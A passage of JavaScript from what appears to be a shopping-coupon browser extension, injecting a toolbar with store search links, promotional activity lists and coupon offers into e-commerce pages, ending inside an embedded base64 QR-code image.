                            $.getJSON("http://product.dangdang.com/index.php",{
                                r:'callback/product-info',
                                productId:spuInfo.isCatalog == '1' && spuInfo.mainProductId != '0' ? spuInfo.mainProductId : spuInfo.productId,
                                isCatalog:spuInfo.isCatalog,
                                shopId:spuInfo.shopId,
                                productType:spuInfo.productType
                            },function (e) {
                                infoGroup.id = location.pathname.replace(/[^0-9]/ig,"");
                                infoGroup.price = e.data.spu.price.salePrice;
                                startPrice(location.origin + location.pathname);
                            })
                        }
                    },false);
                    startSame(location.origin + location.pathname); //当当
                    qtCoupon();
                    startVip();
                }();    //当当页面
                !function () {
                    $(".dypTop9527-logo").on("click","b",function () {
                        openWindow(mainUrl.website);
                    }); // logo点击跳转官网
                    $(".dypTop9527-mall").hover(function () {
                        $(this).children(".dypTop9527-mallDrop").show();
                    },function () {
                        $(this).children(".dypTop9527-mallDrop").hide();
                    }); //商城导航移入移出事件
                    $(".dypTop9527-search").on("click","i",function () {
                        if ($(this).data("type") == 1) {
                            $(".dypTop9527-search ul").show();
                            $(".dypTop9527-search u").show();
                            $(this).data("type",0);
                        } else {
                            $(".dypTop9527-search ul").hide();
                            $(".dypTop9527-search u").hide();
                            $(this).data("type",1);
                        }
                        $(document).on("click",function (e) {
                            var hos = $(e.target).closest('.dypTop9527-search i').length;
                            var hos1 = $(e.target).closest('.dypTop9527-search ul').length;
                            if (!hos && !hos1) {
                                $(".dypTop9527-search i").data("type",1);
                                $(".dypTop9527-search ul").hide();
                                $(".dypTop9527-search u").hide();
                            }
                        });
                    }); // 搜索部分选择不同的电商平台
                    $(".dypTop9527-search").on("click","li",function () {
                        $(".dypTop9527-search span em").html($(this).html());
                        $(".dypTop9527-search span").data("id",$(this).data("id"));
                        $(".dypTop9527-search i").data("type",1);
                        $(".dypTop9527-search ul").hide();
                        $(".dypTop9527-search u").hide();
                    });
                    $("#dypTop9527-searchBtn").click(function () {
                        var q = trim($("#dypTop9527-search").val());
                        if (q) {
                            var url = "";
                            q = encodeURIComponent(q);
                            var obj = {
                                "dyp":mainUrl.website + "coupon/search?val=" + q,
                                "tm":"https://list.tmall.com/search_product.htm?q=" + q,
                                "jd":"https://search.jd.com/Search?enc=utf-8&keyword=" + q,
                                "tb":"https://s.taobao.com/search?q=" + q,
                                "wph":"https://category.vip.com/suggest.php?keyword=" + q,
                                "mgj":"http://list.mogujie.com/s?q=" + q,
                                "yoho":"https://search.yohobuy.com/?query=" + q,
                                "sn":"https://search.suning.com/" + q + "/",
                                "ymx":"https://www.amazon.cn/s/field-keywords=" + q,
                                "dd":"http://search.dangdang.com/?key=" + q,
                                "jm":"http://search.jumei.com/?search=" + q,
                                "kl":"https://www.kaola.com/search.html?key=" + q,
                                "yx":"http://you.163.com/search?keyword=" + q,
                                "yhd":"http://search.yhd.com/c0-0/k" + q + "/",
                                "gm":"http://search.gome.com.cn/search?question=" + q
                            };
                            $.each(obj,function (v,k) {
                                if ($(".dypTop9527-search span").data("id") == v) {
                                    url = k;
                                }
                            });
                            openWindow(url);
                        }
                    }); // 搜索按钮事件
                    $("#dypTop9527-search").on("keyup",function () {
                        if (event.keyCode == 13) {
                            $("#dypTop9527-searchBtn").click();
                        }
                    }); //搜索回车事件
                    $(".dypTop9527-set-box").hover(function () {
                        $(".dypTop9527-setDrop").show();
                    },function () {
                        $(".dypTop9527-setDrop").hide();
                    }); //右边第二个设置鼠标移入移出
                    $(".dypTop9527-setDrop").on("click","li",function () {
                        if ($(this).data("type") == "gb") {
                            $("#dypTop9527").fadeOut();
                            setting.dypTop = "hidden";
                            var type = setting.dypMid;
                            chrome.storage.local.set({dypSetting:{dypTop:'hidden',dypMid:type}});
                            showOrHideTop(0);
                        } else if ($(this).data("type") == "sc") {
                            openWindow(mainUrl.website + "user/collist/");
                        } else if ($(this).data("type") == "fk") {
                            openWindow(mainUrl.website + "index/feedback/");
                        }
                    }); //右边第二个设置下拉列表点击事件
                    $(".dypTop9527-set").on("click","i",function () {
                        showOrHideTop(0);
                    }); //最右边的缩小按钮点击事件
                    $(".dypTop9527-mini").click(function () {
                        showOrHideTop(1);
                    });
                }();    //顶部事件绑定
                !function () {
                    var kaiGuan = JSON.parse(dypSwitch).topFont.value;    //顶部固定滚动活动
                    var url1 = "https://min.douyapu.com/api/act14/plug-0.json";
                    if (kaiGuan == 1) {
                        chrome.extension.sendMessage({name:"universal",url:url1,type:"get",dataType:"json"},function (response) {
                            if (response && response.results && response.results.length > 0) {
                                !function () {
                                    var html = "";
                                    $.each(response.results,function (v,k) {
                                        html += `<li data-douyababapaopao="顶部+活动+ID${k.id}">
                                            <b class="icon${k.act_badge_label}"></b>                        
                                            <a href="${k.act_link}" target="_blank" rel="noreferrer">${k.act_name}</a>
                                        </li>`;
                                    });
                                    $(".dypTop9527-swiper_wrap ul").append(html);
                                    $(".dypTop9527-font_inner li:eq(0)").clone(true).appendTo($(".dypTop9527-font_inner"));
                                    var liHeight = $(".dypTop9527-swiper_wrap").height();
                                    var totalHeight = ($(".dypTop9527-font_inner li").length * $(".dypTop9527-font_inner li").eq(0).height()) - liHeight;
                                    $(".dypTop9527-font_inner").height(totalHeight);
                                    var index = 0;
                                    var autoTimer = 0;
                                    var clickEndFlag = true;    //
                                    function tab() {
                                        $(".dypTop9527-font_inner").stop().animate({
                                            top:-index * liHeight
                                        },400,function () {
                                            clickEndFlag = true;
                                            if (index == $(".dypTop9527-font_inner li").length - 1) {
                                                $(".dypTop9527-font_inner").css({top:0});
                                                index = 0;
                                            }
                                        })
                                    }   //
                                    function next() {
                                        index++;
                                        if (index > $(".dypTop9527-font_inner li").length - 1) {
                                            index = 0;
                                        }
                                        tab();
                                    }   //
                                    autoTimer = setInterval(next,2500);
                                    $(".dypTop9527-font_inner a").hover(function () {
                                        clearInterval(autoTimer);
                                    },function () {
                                        autoTimer = setInterval(next,2500);
                                    });
                                }();
                            }
                        });
                    }
                }();    //顶部和中间(活动页面,固定滚动活动)
                !function () {
                    var kaiGuan = JSON.parse(dypSwitch).midTime.value;  //中间(限时活动)
                    if (kaiGuan == 1) {
                        var page = 0;
                        var last = 1;
                        var url = "http://min.douyapu.com/api/act16/plug-";
                        $(".dypMid9527-box-active").on("click","button.l",function () {
                            if (page > 0) {
                                page -= 1;
                                a(page);
                            }
                        });
                        $(".dypMid9527-box-active").on("click","button.r",function () {
                            if (last) {
                                page += 1;
                                a(page);
                            }
                        });
                        function a(p) {
                            chrome.extension.sendMessage({name:"universal",url:url + p + ".json",type:"get",dataType:"json"},function (e) {
                                if (e && e.results && e.results.length > 0) {
                                    var html = "";
                                    $.each(e.results,function (v,k) {
                                        html += `<li data-douyababapaopao="工具+活动+ID${k.id}"><a href="${k.act_link}" target="_blank" rel="noreferrer"><b></b>${k.act_name}<i class="icon${k.act_badge_label}"></i></a></li>`;
                                    });
                                    $(".dypMid9527-box-active ul").html(html);
                                    last = 1;
                                } else {
                                    last = 0;
                                    page -= 1;
                                }
                            });
                        }   //
                        a(page);
                    } else {
                        $(".dypMid9527-active").remove();
                    }
                }();    //中间(限时活动)
                !function () {
                    var page = sessionStorage.dypPage ? sessionStorage.dypPage : 1;   // 当前第几页
                    var sign = 1;
                    var first = 0;
                    var swi = 1;
                    var times = '';
                    var reqUrl = `${mainUrl.min}&v=网红OR抖音OR减压&page_size=25&page_num=`;
                    $(".dypMid9527-feast").hover(function () {
                        if (first == 0) {
                            get();
                            first = 1;
                        }
                        var that = $(this);
                        times = setTimeout(function () {
                            that.children(".dypMid9527-title").children(".dypMid9527-borderMask").css("borderColor","#fff");
                            that.children(".dypMid9527-box").show();
                        },300)
                    },function () {
                        clearInterval(times);
                        $(this).children(".dypMid9527-title").children(".dypMid9527-borderMask").css("borderColor","#ddd");
                        $(this).children(".dypMid9527-box").hide();
                    });
                    function get() {
                        sign = 0;
                        chrome.extension.sendMessage({
                            name:"universal",url:reqUrl + page,type:"get",dataType:"json"
                        },function (e) {
                            if (e && e.res) {
                                if (e.res.length > 0) {
                                    append(e.res);
                                    page = parseInt(page) + 1;
                                    sessionStorage.dypPage = page;
                                    if (e.res.length < 25) {
                                        sessionStorage.dypPage = 1;
                                    }
                                    sign = 1;
                                } else {
                                    sessionStorage.dypPage = 1;
                                }
                            }
                        });
                    }   //
                    function append(d) {
                        var list = "";
                        $.each(d,function (v,k) {
                            var a = "tb";
                            if (k.type == 2) {
                                a = "tm";
                            }
                            if (!k.shareUrl) {
                                return
                            }
                            list += `<li>
                                <a class="dypClear" data-url="https:${k.shareUrl}" data-douyababapaopao="工具栏+母亲节">
                                    <div class="fl dypMid9527-feast-img">
                                        <img src="${k.picUrl}_80x80.jpg">
                                    </div>
                                    <div class="fl">
                                        <div class="dypMid9527-feast-title"><i></i><span>${k.title}</span></div>
                                        <div class="dypMid9527-feast-nPrice">券后价 : ¥${numSub(k.discountPrice,k.amount)} <span class="dypMid9527-feast-oPrice"> ${k.discountPrice}</span></div>
                                        <div class="dypMid9527-feast-btn"><span>领券下单 立减${k.amount}元</span><i></i></div>
                                    </div>
                                </a>
                            </li>`;
                        });
                        $('.dypMid9527-box-feast ul').append(list);
                    }   //
                    $('.dypMid9527-box-feast ul').on("click","a",function () {
                        openWindow($(this).data("url"));
                    });
                    $('.dypMid9527-box-feast ul').on("scroll",function () {
                        if ($(this).scrollTop() > 500) {
                            if (swi) {
                                cnzzEvent("MID栏母亲节活动","滚动");
                                swi = 0;
                            }
                        }
                    });
                }();    //中间(节日运营活动;母亲节)
                !function () {
                    var qrImg = 'data:image/jpeg;base64,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